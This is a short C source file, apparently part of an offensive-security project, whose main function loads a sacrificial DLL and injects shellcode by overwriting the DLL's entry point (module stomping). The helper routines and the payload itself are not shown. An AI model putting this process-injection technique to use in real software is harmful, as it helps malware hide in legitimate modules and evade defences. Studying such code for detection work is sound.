#include <stdio.h>
#include "structs.h"
#include "main.h"


/*
  Simple example to load a sacrificial DLL and inject shellcode, by stomping its entrypoint
*/


NTAPIS NtAPIs = { 0 };


int main()
{
    HMODULE hModule = NULL;
    ULONG_PTR dllEntry = NULL;
    CONTENT cnt = { 0 };

    if (!GetSC(&cnt)) {
        return 1;
    }

    if (!MapAndCheckDLL(&hModule, &dllEntry, cnt.size)) {
        return 1;
    }

    if (!WriteExec(dllEntry, &cnt)) {
        return 1;
    }

    return 0;
}
